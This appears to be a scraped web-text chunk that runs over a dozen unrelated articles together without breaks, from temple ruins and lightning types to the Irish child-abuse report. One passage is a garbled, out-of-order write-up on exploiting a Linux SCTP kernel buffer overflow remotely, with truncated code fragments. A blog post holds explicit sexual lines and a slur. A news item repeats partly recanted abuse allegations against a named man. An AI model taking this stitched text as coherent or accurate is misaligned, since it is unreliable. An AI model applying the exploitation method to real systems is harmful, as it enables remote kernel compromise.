The most intact and spectacular group of temples is instantly recognizable because of their tall towers and intricate carvings .
Most people forget about the other temples scattered in a hundred km radius of the main complex .
Beng Mealea ( about 60 clicks from Angkor ) is most unrestored , but impressively large , structure with trees and vines thriving all over the grounds .
Ta Phrom

This has become one of Cambodia ’s most famous temples , partially because it was featured in one of the Tomb Raider movies .
Visitors line up for their chance to snap the obligatory “ roots hugging ruins ” shot .
It is hardly the wild experience that those pix might suggest , but impressive nonetheless .
Cham Ruins , Vietnam
( images via sixty 4coupe and cgerb )
The Cham ruins found in central Vietnam date back to pre-Buddhist times .
There is a strong Hindu influence in these nearly completely unrestored structures .
Unfortunately , some of the temples were destroyed during heavy fighting in the 1960s .
Nepal

Roadside shrines are a regular feature of the geography of Nepal .
Some have mysterious histories and are the sources of almost mythical stories .
Others simply sit quietly on the hillsides , seemingly at peace with their ever encroaching surroundings .
Bali

Bali ’s Hindu temples have an otherworldly vibe .
The vertical , ancient structures are decorated with dramatic statues and carvings .
Bali is one of Indonesia ’s greenest islands , and nature finds its way into everything , even these storied religious monuments .
East Africa
( images via kelceyhoff and squinchez )
East Africa is home to some of the oldest religious buildings in the world .
Temples , mosques and churches from a thousand years ago ( or more ) are found throughout Kenya , Tanzania , Somalia and Eritrea .
Some , like the Gedi Mosque ( at left ) , were recently excavated .
Many more remain mostly untouched by anything except nature .
Middle East
The Middle East is home to numerous abandoned religious structures .
Some have simply fallen into disuse because of their sheer age .
Such was the case for the mosque , at left , in Egypt .
Mosques in the disputed Golan Heights are recent ruin : the result of years of conflict between the major religious groups in the area .
The structures are simply left to the desert because it is not possible to safely return them to their former glory .
Churches

Abandoned churches can be found throughout the U.S. , especially in rural areas .
The lack of funding and religious leadership have caused some of these churches , like the one is rural Minnesota above , to close their doors .
India ’s Best Archaeological Site

The recently discovered Talakadu temples were hidden for years under the sand near the Indian city of Bangalore .

There 's a Difference
Reader " Roger " sent us this note :
I got an education this last weekend .
I did not realize there was a difference between a " health " expo and a " wellness " expo .
My buddy got us a booth to display our line of supplements and power nutrition .
As I walked into the event center , I saw a couple of chiropractors .
I do n't know what you think about them , but they were there teaching people about good posture .... okay , no problem .
As soon as I walked in the door to the main exhibit room , I was floored .
First thing I saw was " aroma therapy " ... doh !!
Then there was a guy sitting between two pillars with a crystal dangling between them .
He " channels " energy to the crystal because the nearest vortex is about 1000 miles away .... double doh !!
Of course , the psychics , clairvoyants , and mediums all had booths and were offering readings ....
" Doh " does n't cover it here .
The event started at 11 .
About 10:45 , about ¾ of the people in there started to meditate with an eerie chant .
There was reiki , feng shui , an oxygen bar , light therapy , angel readings , crystal therapy - with crystals from the Himalayas ...
The type of people who came were exactly the type you 'd expect .
I could look around and see there were people who ran booths who actually believed they were helping people .
Then there were the ones who I could tell were exploiting people - they did n't believe this crap any more than I did , but they charged $ 35 up to $ 50 for 15 - minute readings .
The sad thing is , people lined up to give these people their money .
I honestly think that our booth was the only legitimate business in the whole expo .
I guarantee that I will remember the difference between a " health " expo and a " wellness " expo .
P.S. I almost put on a turban and charged $ 10 for readings .
That would 've been a bargain ... haha .
My conscience got the best of me , though .
I could n't do it as a reader of SWIFT .
Thank you , Roger .
So long as the public remains naive and - so often - just plain dumb , these leeches will profit .
George Burns once said it : " In showbusiness , the most important thing is sincerity , and if you can fake that , you 've got it made . "
George was right .
The weekend magazine of the St. Louis Post - Dispatch just did a story about the hottest places to make out in St. Louis , where I used to live .
All fine and well , but the cover image of the story featured a hot chocolate daddy and his white girlfriend .
This simple image released the Rednecks and sparked a wave of online controversy against interracial coupling .
“ 1buschstadiumplz ” comments “ Have n’t read the story but do n’t like to see blacks and whites kissing . ”
So sexy .
“ John ” upped the ante : “ I am supposed to accept that some people choose to have interracial relationships .
That is fine with me , do what you want .
However , I choose to think it is not something I would expose myself to . ”
Gorgeous .
What is wrong with these people ?
Sheesh !
Okay , so it ’s Missouri ( Missourah if you ’re nasty ) ; some kind of racial bigotry is to be fully expected .
That ’s why I escaped and reinvented myself into East Coast Glitterati / Intelligentsia .
But no matter where you go , Chicago , Los Angeles or even New York , people are still squeamish about interraciality .
Especially gay dudes .
When I was single and frequenting such highly respected gay dating sites like DList , I ca n’t tell you the number of profiles that specified , and I repeat , specified , that the dude was only interested in dating other WHITE guys .
Their profiles would just bust out , “ Sorry , not into Black men .
I ’m not racist — it ’s just a preference . ”
And others were a dollop more tasteful : “ Into All Types of Men — Asian , Latinos , Whites , Arabs , Spanish , Canadian , Hawaiian , Filipino , Indian ” — basically , anybody but a brotha .
Ca n’t a brotha get some love ?
I ’m not sure that a lot of people know this , but gay men can be among the most “ racist ” men out there .
The funny thing is that the “ racist ” gays are n’t like KKK dudes ; they often just refuse to sleep with anybody who is n’t white .
And while that ’s more of a private kind of racism based on personal choice , what annoys me about it is that it holds this kind of barrier between white guys and everyone else fully in tact .
Part of this stems from the fact that the majority of gay culture is really , really white .
Hot , white Abercrombie jocks are upheld as the standard of beauty par excellence .
Do n’t believe me ?
Go to www.seancody.com or www.dudetubeonline.com and see for yourself .
Do you see any ethnic men ?
The basic point is that if U R not white and hot like the Abercrombie / Sean Cody trannies , you sort of do n’t exist in the gay world .
This is the story of many hot black gays , who lust after hot white guys or others only to get the door slammed in their faces .
I know it ’s really complicated , but if you ask me , when a racist gay says NOT INTO BLACKS it means that he ’s not attracted to the fictionalized idea of what black dudes are supposed to be like .
You know , the stuff we see on Fox News every night : the thugs , the gold teefs , the hip - hops , the saggy pants , etc .
These are the stereotypes of black guys that trump whether or not they are educated , rich , etc .
So the really scary thing is not just the stereotype , but that people assume that this is what all black men are like .
I wonder if the Rednecks in St. Louis were more annoyed by the local stereotype of black men , or is it the literal mixing of races that they find repugnant ?
Monoracial dating — that ’s what I call it — is totally boring .
White on Latino !
Black on Asian !
Asian on Arab !
Let ’s mix that shit up .
If you ask me , we ’re programmed to be attracted to people within our own race .
Many of us grew up in monoracial households , so naturally we get used to that rhythm .
But it does n’t have to be that way .
People will retort and say stuff like , “ Oh , I ’m just attracted to blue eyes . ”
But that ’s a standard of beauty that ’s forced down our throats via popular culture .
Folks should be able to find qualities they like in other people , regardless of their race .
For instance , I am attracted to types of guys more than anything else .
Most of the dudes I find attractive look like they will pass out from a drug overdose at any moment .
If he ’s tall , skinny , tatted , wearing skinny pants or plays in a band , I ’m gonna wanna take his cock out , no matter the race .
I ’m not trying to invalidate monoracial relationships , cause those can be really fierce , too !
I ’m just sick of people being “ opposed ” to interracial dating .
Go try some dark meat .

A longtime Wikipedia admin has been caught editing the online encyclopedia in exchange for cash .
But the Wikicult can't decide if that 's a problem .
Earlier this week , someone noticed a post to an online job marketplace where an entrenched Wikifiddler was advertising his Wikiservices .
" Besides technical writing , I also am an accomplished senior Wikipedia administrator with several featured articles to my name , " read the post , which has since been changed .
" If you need a good profile on Wikipedia , I can help you out there too through my rich experience . "
The job site actually shows two cases where the admin was hired to edit Wikipedia - here and here .
And as a result , it would appear that article edits were at least begun , including those here and here .
Wikipedia co-founder Jimmy " Jimbo " Wales was promptly notified with a public Wikipost , and an army of Wikifiddlers proceeded to search their Wikisouls , asking whether the so - called " Cash for Spam " offer undermined their efforts to maintain an encyclopedia with a " neutral point of view . "
For many , the answer is " no . "
You see , as it seeks to build a " neutral " encyclopedia , the Wikicult is also intent on creating some sort of Web 2.0 utopia where you assume that every anonymous fiddler will gladly police themselves .
" If a paid editor is going to be editing , they should be following the PRSA code of ethics , " writes someone calling themselves Hipocrite , " specifically the parts about avoiding deceptive practices and revealing the sponsors for causes and interests represented . "
Jimbo disagrees with this Wikilogic , arguing that paid edits would certainly undermine the site 's credibility .
Back in 2006 , Wales famously shot down a fledgling paid - edit outfit known as MyWikiBiz , which was forced to reinvent itself outside of Wikiland .
" It is not ok with me that anyone ever set up a service selling their services as a Wikipedia editor , administrator , bureaucrat , etc. , " he writes .
" I will personally block any cases that I am shown .
There are of course some possibly interesting alternatives , not particularly relevant here , but the idea that we should ever accept paid advocates directly editing Wikipedia is not ever going to be ok .
Consider this to be policy as of right now . "
But some cult members have complained that in voicing his disagreement , Jimbo has undermined the site 's commitment to Wikidemocracy .
You see , in Wikiland , no one person is allowed to set Wikipolicy .
And that includes the cult 's self - proclaimed Spiritual Leader .
Some have also pointed out that whereas Jimbo frowns on individual editors making cash from the free encyclopedia , he has no problem doing so himself .
Wales makes upwards of $ 75,000 for each of his Wikipedia - centric speaking engagements .
And it's no secret he has dreams of turning the Wikimedia Foundation into a for - profit operation .
Then there 's that time he had Wikipedia edited in exchange for sex .
But this is Wikiland - where such self - contradiction is n't a contradiction .
Wales has vowed to block anyone who edits Wikipedia for money .
But someone was just been caught doing so .
And the vow is still just a vow .
Presumably , the site 's credibility just took a hit . ®
The jets that people fly in corporate aviation are usually a lot smaller than that found with the airlines .
Exceptions to the rule are Boeing 's BBJ and Airbus ' Corporate Jet , both of which are based on some of the smaller types of aircraft marketed to the airlines .
A corporate flight attendant is typically utilized on a " cabin class " aircraft .
They are larger aircraft with usually 19 or less seats , where you can easily get up and walk around the cabin .
Compared with a Westwind , Lear , or Cessna , the larger jets have an aisle to walk up and down upon and the headroom usually is adequate to allow easy passage of anyone under 6 ' tall .
Some of the major producers of cabin class aircraft include : Bombardier Challenger / Canadair , Dassault Falcon Jet , and Gulfstream aircraft .
In addition , Embraer has recently entered the market and there are various Hawker 800XPs and other similarly sized aircraft that sometimes will utilize a flight attendant .
It really all depends on what the customer wants .
Across the board , corporate aircraft are exquisitely outfitted .
Just about every creature comfort imaginable is included ; literally the corporate boardroom is transplanted from the 41st floor to 41,000 feet !
Custom mahogany cabinetry , full leather seating , premium carpeting , wood - veneer paneling , chenille sofas , are some of the things found in the cabin , while the galley can be equipped with elm - burl wood , complete with personalized crystal barware .
Many galleys also contain items such as a high temperature oven , microwave , dual Krupps coffee maker and hot cup .
Most of the Gulfstream aircraft in flight are under the designation of Gulfstream II , III , IV , and V .
Although in the past year , the company has changed the designations to 200 , 300 , 400 , 450 , 500 , 550 with the lower numbered aircraft being smaller in size .
Dassault Falcon Jet has several popular entries including the 900 and 2000 .
In a few more years the 7X will make its debut as the newest entry in the Falcon Jet family .
Bombardier has several aircraft under the Challenger and Canadair moniker .
Their newer aircraft will all have the Bombardier name , but in the meantime , the popular Challenger 604 and Global Express along with their 5000 model are some of the cabin class aircraft being flown today .
Lastly , Embraer has recently entered the business jet fray with their Legacy aircraft .
Long a builder of regional jets , Embraer aircraft should start showing up increasingly as they are the low cost price leader in their category .

Again , good news .
The stream pointers are self - contained .
They point inside the previously allocated buffer , and more precisely the input stream is located exactly after the header .
No kfree ( ) will ever be called on these pointers : in other words they are a safe place to overwrite , and there 's no need to worry about post - exploitation recovery .
The last thing that may complicate a bit the exploit is a check that the kernel makes before invoking sctp_ssn_skip ( ) :
/net/sctp/ulpqueue.c : sctp_ulpk_skip( ) :
if ( SSN_lt ( ssn , sctp_ssn_peek ( in , sid ) ) )
return ;
/* Mark that we are no longer expecting this SSN or lower .
*/
sctp_ssn_skip ( in , sid , ssn ) ;
with SSN_lt ( ) :
enum {
SSN_SIGN_BIT = ( 1 < < 15 ) >
Strictly speaking this code checks if the value we are overwriting ( the old SSN content ) is greater or equal to the new value : if so it does n't process the FWD chunk .
The comparison here is made using Serial Number Arithmetic ( like the one used for protocol sequence number ( eg. tcp seq number ) ) and can be fooled writing multiple chunks until it legally wraps around to a well known defined value .
Then , at this point , if we know the target running kernel , we can :
1 ) Control the slab / slub to be used
2 ) Overwrite a safe pointer close to the overflowing buffer
3 ) Easily control overwritten data ..

" Buffer overflow in net / sctp/sm_statefuns.c in the Stream Control Transmission Protocol ( sctp ) implementation in the Linux kernel before 2.6.28 - git8 allows remote attackers to have an unknown impact via an FWD - TSN ( aka FORWARD - TSN ) chunk with a large stream ID .
" " The SCTP stack did not correctly validate FORWARD - TSN packets .
A remote attacker could send specially crafted SCTP traffic causing a system crash , leading to a denial of service .
( CVE - 2009 -0065 ) " " a buffer overflow was found in the Linux kernel Partial Reliable StreamControl Transmission Protocol ( PR - SCTP ) implementation .
This could , potentially , lead to a denial of service if a Forward - TSN chunk is receivedwith a large stream ID .
( CVE - 2009 - 0065 , Important ) " Potentially a DoS? Unknown Impact ?
Really ? : DI 'm wondering why kernel developers ( or vendors ? ) continue to claim that kernel memory corruption are just Denial of Service .
Most of the times they _are_ exploitable .. yes , even when the vulnerability is remotely triggered , yes .. even when the corruption takes place in a freaking slub in the middle of a kernel _heap_ .. yes even when you have kernel data pages marked NX and the kernel . text read - only and yes , absolutely yes even when you start only with a 16 bit displacement ... Last month one of my customer ( that has a _custom_ deployed sctp application on his network ) asked me if the vulnerability may have some impact on his systems .
The answer ?
" Yes it does " , and since someone thinks that is not exploitable and someone else speculates over a possible locally privilege escalation only ( with remote host sending TSN packet ) i decided to write a completely remote exploit .
It is extremely reliable ( nearly one - shot always ) , given that you know the target kernel .
I tested it on Ubuntu 8.04 and Ubuntu 8.10 server boxes running with different kernels ( ubuntu kernel for amd64 ) and on OpenSuse11.1 and a Fedora Core 10 ( yes , extra - brownie points here , it works great on Selinux too ) .
... I dont want to talk about the exploit , because the code should be self explanatory , but i'd like to briefly explore the vulnerability :
From an exploit writer point of view , the most critical points are : where the memory corruption occurs , when it occurs and what type of data structures are involved .
The code that triggers the overflow is on sctp_ssn_skip ( ) in the file : /net/sctp/structs.h:
Parameter " id " is not checked and later used as an index referenced by stream -> ssn pointer : a 16 bit value .
We can only overwrite memory _close_ the the struct involved .
Let 's take a look at the sctp_stream structure and its stream pointer..sctp_ssnmap_new ( ) and sctp_ssnmap_init ( ) function are inStructures involved in streams mapping are :
The code that allocates them is the following :
If the size is under the MAX_KMALLOC_SIZE threshold the function dynamically allocates the sctp_ssnmap struct using as a parameter the number of in and out streams .
That 's good news !
Manipulating sctp handshake options we can arbitrary ( if the sctp application has no application - level checks on , f.e. , the number of simultaneously opened SCTP streams ) decide the slab that will be used to allocate the chunk .
Immediately after that , the function callsto initialize in / out stream pointers :
Editor 's Note added on April 8 , 2010
On March 17 , 2010 , almost 13 months after this article was published , Michael Johnson , one of the individuals quoted in this article , contacted The Register to recant claims he made about Ryan Goldstein .
" It was a false and fabricated account , which was created because the pressure from the community to discredit Mr Goldstein , " he wrote in an email .
" I was out to harm Ryan Goldstein , not to ruin his life .
However , i can't say the same for others , which is maybe what [ sic ] they are adamant that their statement is infact [ sic ] a true account . "
Johnson declined to elaborate on the pressure he allegedly received or to provide support for those claims .
In order to alert our readers to this development , The Register is adding this editor 's note and striking a line through the 55 - word passage that contains Johnson 's account .
As former moderators for an internet relay channel dedicated to hacking , Francine Campbell and Sterlin Ward have seen some of the net 's darker quarters .
But nothing prepared them for their group 's encounter with an internet pedophile who called himself Digerati .
After the hacker repeatedly propositioned channel members as young as 13 to engage in graphic webcam sex , Campbell and Ward alerted the FBI and officials at the University of Pennsylvania , where Digerati attended classes and got his internet access .
Digerati - whose real name is Ryan Goldstein - was eventually prosecuted , but the experience left the channel elders - and some law - enforcement experts - critical of what they characterize as a Faustian deal
In exchange for Goldstein 's help prosecuting seven cases involving botnets , federal prosecutors agreed to charge him with a single misdemeanor hacking charge for damage he inflicted on a University of Pennsylvania server .
In October , he received just three months in prison despite being caught with about 1,000 images of child pornography .
For Francine Campbell , Sterlin Ward , and others on the #ssgroup IRC channel , it was a bitter lesson in the vagaries of crime and punishment in the digital age .
" I think protecting kids would be way more important than monetary damages to a server , " says Ward , a 35 - year - old networking analyst who took an early stand against Goldstein 's online grooming of underage members .
" I felt that he was going to eventually find a kid that was close enough for a meetup . "
Ronald Levine , a Philadelphia - based attorney representing Goldstein , issued the following statement : " Mr. Goldstein denies this allegation .
He admitted the misdemeanor computer intrusion conduct with which he was charged ; he received a probationary sentence ; and he is committed to moving forward with his life productively . "
But Goldstein 's former online associates stand by the accusations , and they presented emails and chat logs that appeared to back them up .
In their minds , the episode shows the sometimes misplaced priorities of law enforcement and university administrators .
Lightning comes in more flavors than you can shake a metal rod at — positively or negatively charged , headed up or down , hitting the ground or another cloud .
Atmospheric scientists know that ice particles in a thundercloud become slightly charged .
Eventually , a negatively charged layer of the storm gets sandwiched between two positives .
Electricity arcs among the layers , ionizing the air and making it glow .
But experts have yet to understand the bolts ’ behavior .
Researchers are now tracking the radio waves and x-rays produced by lightning , and they ’re even experimenting with synthetic strikes ( made with rockets ! ) .
Here ’s their current thinking .
11 Types of Bolts
1. Gigantic jet About 80 percent of all storm discharges are intracloud .
But if one heads up and hits a weak positive charge in the upper layer , it exits skyward .
2 . Bolt from the blue Gigantic jets can exit the cloud sideways and touch down miles away from the storm that spawned them under a clear blue sky .
3 . Spider
These discharges travel up to 60 miles per second over huge distances , moving laterally through horizontal layers .
4 . Beaded Certain segments of the kinked ion channel seem to glow brighter when seen from a particular angle .
5 . Forked
When too much negative charge builds up at the end of a bolt , its channel can split apart in midair to form two or more offshoots .
6 . Ribbon Multiple strikes sometimes share the same channel .
If the wind blows the channel sideways , the eye perceives a band of light in the microseconds between strokes .
7 . Zigzag
As a storm dissipates , air between the cloud and the ground holds pockets of charge .
This produces bolts that hop groundward from one pocket to the next .
8 . Ball Grapefruit - sized , glowing spheres of electricity have been reported in the vicinity of thunderstorms .
No one knows why .
9 . Energetic narrow bipolar
These intracloud flashes are one of the strongest natural source of radio emissions .
They last only 10 microseconds .
10 . Red sprite Positively charged cloud - to - ground lightning makes the cloud more negative .
That negative field reaches upward above the cloud , where lower air densities mean less energy to produce a discharge — which then glows red .
11 . Blue jet According to one theory , negatively charged cloud - to - ground lightning makes the cloud more positive ; the storm pumps the excess positivity skyward in a high - energy burst that makes the ionized air around it glow blue .

Says international law , convention obligates Obama government to begin criminal investigation or extradite to country that would prosecute
Congressional Democrats indicate willingness to proceed with investigations ...
Brad Friedman Byon 1/24/2009 , 5:30 pm PT
From Scott Horton at Harper's ...
In an interview on Tuesday evening with the German television program “ Frontal 21 , ” on channel ZDF Professor Manfred Nowak , the United Nations Rapporteur responsible for torture , stated that with George W. Bush ’s head of state immunity now terminated , the new government of Barack Obama was obligated by international law to commence a criminal investigation into Bush ’s torture practices .
“ The evidence is sitting on the table , ” he stated .
“ There is no avoiding the fact that this was torture . ”
He pointed to the U.S. undertakings under the Convention Against Torture in which the country committed that it would criminally prosecute anyone who tortured , or extradite the person to a state that would prosecute him .
“ The government of the United States is required to take all necessary steps to bring George W. Bush and Donald Rumsfeld before a court , ” Nowak said .
...
Law professor Dietmar Herz clarifies that under U.S. and international law , George W. Bush bears personal responsibility for the introduction of torture .
From the point of his departure from office , head of state immunity terminates , and under clear principles of international law , the United States is obligated to commence a criminal investigation and then a prosecution .
In related news , top Congressional Democrats , including Senators Reid , Levin and Whitehouse , as well as Representatives Pelosi , Hoyer and Conyers have all indicated recently , in various forms , interest in investigations and / or accountability for various Bush crimes , which , reports Jason Leopold at Public Record , amounts to a growing consensus among Dems to approve a probe into torture allegations , and perhaps more .
UPDATE 1/26/09 :
In an interview with CNN , Nowak said he believes there is already enough evidence to prosecute fomer SecDef Don Rumsfeld :
" We have clear evidence , " he said .
" In our report that we sent to the United Nations , we made it clear that former Defense Secretary Donald Rumsfeld clearly authorized torture methods and he was told at that time by Alberto Mora , the legal council of the Navy , ' Mr. Secretary , what you are actual ordering here amounts to torture . '
So , there we have the clear evidence that Mr. Rumsfeld knew what he was doing but , nevertheless , he ordered torture . "
RAW STORY has the video of the CNN interview with Nowak ...
The use of illicit drugs must be decriminalised if efforts to halt the spread of Aids are to succeed , one of the world 's leading independent authorities on the disease has warned .
In an unprecedented attack on global drugs policy , Michele Kazatchkine , head of the influential Global Fund to Fight Aids , Tuberculosis and Malaria , has told the Observer that , without a radical overhaul of laws that lead to hundreds of thousands of drug users being imprisoned or denied access to safe treatment , the millions of pounds spent on fighting HIV and Aids will be wasted .
Kazatchkine will use his keynote speech at the 20th International Harm Reduction Association conference tomorrow in Bangkok to expose the failures of policies which treat addiction as a crime .
He will accuse governments of using what he calls " repressive " measures that deny addicts human rights rather than putting public health needs first .
He will argue that governments should fully commit to the widespread provision of harm reduction strategies aimed at intravenous drug users , such as free needle exchanges and providing substitutes to illicit drugs , such as methadone .
" A repressive way of dealing with drug users is a way of facilitating the spread of the [ HIV / Aids ] epidemic , " Kazatchkine said .
" If you know you will be arrested , you will not go for treatment .
I say drug use cannot be criminalised .
I 'm talking about criminalising trafficking but not users .
From a scientific perspective , I cannot understand the repressive policy perspective . "
He condemns policymakers who argue that , because drug users frequently turn to crime to fund their habit , it justifies making it a criminal justice issue .
Harm reduction both helps the addict and wider society and reduces the need to commit crime , he said .
" The one population where [ Aids ] mortality has been untouched - and in fact has worsened - has been IV [ intravenous ] drug users .
It 's amazing , because what we call harm reduction , such as exchanging needles , has been scientifically proven as the most effective .
" This is why I will most probably start my speech in Bangkok by mentioning the contrast between major progress achieved in decreasing mortality from Aids in the poorest countries of the world versus the total lack of progress for what is the main route of transmission in most parts of the world outside Africa . "
Kazatchkine suggested that politicians feared that the public would label them soft on drugs .
A doctor and respected Aids expert with 20 years in the field , he has in his two years at the helm of the Global Fund overseen some of the most dramatic improvements in treatment and prevention of HIV globally .
Since it was established in 2001 , the fund has received $ 21bn in contributions from the world 's wealthiest nations and used it to play a significant part in reducing rates of new HIV infections .
It has also contributed to the distribution of much needed life - preserving anti-retroviral drugs to millions of people already diagnosed .
Alex Stevens , a senior research fellow specialising in drugs and criminalisation at the University of Kent , said tomorrow 's speech would highlight many of the troubling consequences of criminal justice approaches to drugs policy .
" In many countries , serious human rights infringements are committed in the name of fighting drugs , " he said .
" These include the use of the death penalty for drug offences , compulsory treatment regimes that include methods ( such as physical beatings ) that are akin to torture , and , for example in the USA , depriving convicted drug law offenders of the right to vote . "
Stevens said that , while the UK was ahead of many other countries on harm reduction , its tendency to criminalise drug users could undermine its efforts .
What is needed , Kazatchkine will argue tomorrow , is a total rethink of drugs policies .
" What I 'm saying is that government 's function is to protect their citizens .
This is why harm reduction should be supported by all governments everywhere . "

Capital Gate , the iconic leaning building in Abu Dhabi , reached halfway point .
The building , designed by international architects RMJM , will lean 18 degrees westward , 14 degrees more than the Leaning Tower of Pisa .
To make this possible , the central core of the building slants in the opposite direction to the lean of the structure , and it straightening as it grows .
It sits on top of a 7 - foot - deep concrete base with a dense mesh of reinforced steel .
The steel exoskeleton known as the diagrid sits above an extensive distribution of 490 piles that have been drilled 100 feet underground to accommodate the gravitational , wind and seismic pressures caused by the lean of the building .
A gigantic internal atrium , including a tea lounge and swimming pool suspended 263 feet above the ground , has been constructed on the 17th and 18th floors , the halfway point of the 35 - story , 525 - foot tall tower .

Capital Gate will house Abu Dhabi ’s first Hyatt hotel – Hyatt at Capital Centre , a presidential - style luxury , 5 - star hotel and will provide 200 hotel rooms for Abu Dhabi and will serve ADNEC ’s ( Abu Dhabi National Exhibitions Company ) visitors and exhibitors as well as international business and leisure travelers .
The FTC has launched legal action against a Californian web hosting service it says is responsible for botnets , malware , credit card theft and of course spam .
The provider has been disconnected and its operators now face a lawsuit .
The FTC alleges that Pricewert / 3FN operates as a “ ‘ rogue ’ or ‘ black hat ’
Internet service provider that recruits , knowingly hosts , and actively participates in the distribution of illegal , malicious , and harmful content , ” including botnet control servers , child pornography and rogue antivirus products .
3FN also operates by the names APS Telecom and APX Telecom .
The provider is known as a frequent host of “ scraper ” or autoblog sites — fake blogs that re-publish unauthorized copies of content taken from other blogs , often sending spam pingbacks and trackbacks in the process .
Our sources indicate the network also provided services to several of the major forum and comment spammers .
In particular , web sites owned by the developers of several spambot programs have been shut down ( though we expect they will resurface elsewhere before long ) .
Of course if you ’re using Akismet you wo n’t notice much of a difference : Akismet has long been highly effective at catching spam produced by their spambots and autoblogs .
Our stats suggest a significant and immediate drop in overall spam levels coinciding with the FTC ’s action – on the order of about a 20 % reduction ( in spam that was or would be successfully caught by Akismet ) .

A fiercely debated , nine - year investigation into Ireland 's Roman Catholic - run institutions says priests and nuns terrorised thousands of boys and girls in workhouse - style schools for decades — and government inspectors failed to stop the chronic beatings , rapes and humiliation .
High Court Justice Sean Ryan today unveiled the 2,600 - page final report of Ireland 's Commission to Inquire Into Child Abuse , which is based on testimony from thousands of former students and officials from more than 250 church - run institutions .
More than 30,000 children deemed to be petty thieves , truants or from dysfunctional families — a category that often included unmarried mothers — were sent to Ireland 's austere network of industrial schools , reformatories , orphanages and hostels from the 1930s until the last church - run facilities shut in the 1990s .
The report found that molestation and rape were " endemic " in boys ' facilities , chiefly run by the Christian Brothers order , and supervisors pursued policies that increased the danger .
Girls supervised by orders of nuns , chiefly the Sisters of Mercy , suffered much less sexual abuse but frequent assaults and humiliation designed to make them feel worthless .
" In some schools a high level of ritualized beating was routine .
...
Girls were struck with implements designed to maximize pain and were struck on all parts of the body , " the report said .
" Personal and family denigration was widespread . "
Victims of the system have long demanded that the truth of their experiences be documented and made public , so that children in Ireland never endure such suffering again .
But most leaders of religious orders have rejected the allegations as exaggerations and lies , and testified to the commission that any abuses were the responsibility of often long - dead individuals .
Wednesday 's five - volume report sides almost completely with the former students ' accounts .
It concludes that church officials always shielded their orders ' pedophiles from arrest amid a culture of self - serving secrecy .
" A climate of fear , created by pervasive , excessive and arbitrary punishment , permeated most of the institutions and all those run for boys .
Children lived with the daily terror of not knowing where the next beating was coming from , " the report concluded .
The commission said overwhelming , consistent testimony from still - traumatized men and women , now in their 50s to 80s , had demonstrated beyond a doubt that the entire system treated children more like prison inmates and slaves than people with legal rights and human potential .
The report proposed 21 ways the government could recognize past wrongs , including building a permanent memorial , providing counseling and education to victims and improving Ireland 's current child protection services .
But its findings will not be used for criminal prosecutions — in part because the Christian Brothers successfully sued the commission in 2004 to keep the identities of all of its members , dead or alive , unnamed in the report .
No real names , whether of victims or perpetrators , appear in the final document .
Irish church leaders and religious orders all declined to comment Wednesday , citing the need to read the massive document first .
The Vatican also declined to comment .
The Irish government already has funded a parallel compensation system that has paid 12,000 abuse victims an average of € 65,000 ( $ 90,000 ) .
About 2,000 claims remain outstanding .
Victims receive the payouts only if they waive their rights to sue the state and the church .
Hundreds have rejected that condition and taken their abusers and those church employers to court .
Wednesday 's report said children had no safe way to tell authorities about the assaults they were suffering , particularly the sexual aggression from church officials and older inmates in boys ' institutions .
" The management did not listen to or believe children when they complained of the activities of some of the men who had responsibility for their care , " the commission found .
" At best , the abusers were moved , but nothing was done about the harm done to the child .
At worst , the child was blamed and seen as corrupted by the sexual activity , and was punished severely . "
The commission dismissed as implausible a central defense of the religious orders — that , in bygone days , people did not recognize the sexual abuse of a child as a criminal offense , but rather as a sin that required repentance .
In their testimony , religious orders typically cited this opinion as the principal reason why sex - predator priests and brothers were sheltered within the system and moved to new posts where they could still maintain daily contact with children .
But the commission said its fact - finding — which included unearthing decades - old church files , chiefly stored in the Vatican , on scores of unreported abuse cases from Ireland 's industrial schools — demonstrated that officials understood exactly what was at stake : their own reputations .
It cited numerous examples where school managers told police about child abusers who were not church officials — but never did this when one of their own had committed the crime .
" Contrary to the congregations ' claims that the recidivist nature of sexual offending was not understood , it is clear from the documented cases that they were aware of the propensity for abusers to re-abuse , " it said .
Religious orders were chiefly concerned about preventing scandal , not the danger to children , it said .
The commission also condemned Ireland 's Education Department for aiding the abusive culture through infrequent , toothless inspections that deferred to church authority .
Inspectors were supposed to restrict the use of corporal punishment and make sure the children were adequately fed , clothed and educated — but the report called those inspections " fundamentally flawed . "
It said a lone inspector was responsible for monitoring more than 50 industrial schools , schools were told about the visits in advance and inspectors rarely talked to the children .
Wednesday 's report also highlighted the rarity of human kindness in the institutions .
" A word of consideration or encouragement , or an act of sympathy or understanding , had a profound effect .
Adults in their 60s and 70s recalled seemingly insignificant events that had remained with them all their lives , " the report said .
" Often the act of kindness , recalled in such a positive light , arose from the simple fact that the staff member had not given a beating when one was expected . "

THE MAIN RECOMMENDATIONS
For those that have suffered
A memorial should be erected and inscribed with the words of a special statement made by the Taoiseach in 1999 apologising to the victims .
The state and the religious congregations need to accept that the system failed the children and examine how ideals were “ debased by systematic abuse ” .
Counselling and educational services need to be provided .
Residents who were deprived of their family identities when they were put in care should be helped to trace relatives .
To prevent and protect children from future abuse
Childcare policies should be centred on the child and adults entrusted with their wellbeing should prioritise protection above any loyalty to institutions .
The focus of institutions should be on children and not on the organisations in which they are in .
A process of evaluating services against a national childcare policy should be set up .
A database of children in care should be set up and include their educational needs .
Rules and regulations should be clearly enforced in institutions a practice which was frequently ignored by all in the past , including the Department of Education .
Managers and those supervising and inspecting services should check regularly that standards are observed .
All services for children should be regularly probed by independent inspectors using objective standards and unannounced visits .
Management should be responsible for care provision and the vetting of staff and volunteers , training , supervision , ensuring rules are adhered to and setting up a complaints system .
The Department of Health should look to international standards to determine how children in care can communicate their concerns in trust .
There should be an efficient standard of communication between departments , agencies and childcare facilities .
A consistent care figure with overall responsibility should be in place for children .
Childcare services should continue to support young adults when they leave the supervision of the state .
People who have been in care should be consulted about the failings of the state system .
Children should be kept in contact with their families , apart from in exceptional circumstances .
All personal records of a child in care should be kept updated , secure and private .
National guidelines on the protection of children should be implemented when dealing with abuse allegations .
THE CONCLUSIONS
Physical and emotional abuse and neglect were features of the institutions and the congregations ’ failure to manage schools led to institutional abuse .
The “ deferential ” and “ submissive ” attitude of the Department of Education towards the congregations compromised its ability to carry out its statutory duty to monitor schools .
Financial “ commitments ” made by the religious congregations allowed the industrial school system to thrive .
More kindness and humanity would have gone far to make up for the poor standards of care .
PHYSICAL ABUSE
Regulations regarding use of corporal punishment were disregarded .
Industrial schools depended on rigid control by means of severe corporal punishment to survive .
Children lived with the daily terror of not knowing where the next beating was coming from .
Children who ran away were subjected to extremely severe punishment .
Complaints by parents and others made to the Department of Education were not properly investigated .
